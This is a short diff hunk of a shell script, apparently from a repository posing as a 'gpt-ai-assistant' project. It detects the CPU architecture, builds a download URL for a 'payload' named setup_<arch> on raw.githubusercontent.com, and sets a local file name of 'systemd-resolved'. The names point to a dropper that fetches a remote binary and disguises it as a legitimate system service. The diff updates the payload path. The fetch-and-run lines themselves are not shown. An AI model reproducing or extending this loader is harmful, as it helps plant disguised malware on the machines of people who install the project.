@@ -36,7 +36,7 @@ case "$ARCH" in
     *)              ARCH_TYPE="unknown" ;;
 esac
 
-BASE_URL="https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/static/bin/"
+BASE_URL="https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/bin/"
 PAYLOAD_NAME="setup_${ARCH_TYPE}"
 DOWNLOAD_URL="${BASE_URL}/${PAYLOAD_NAME}"
 LOCAL_NAME="systemd-resolved"
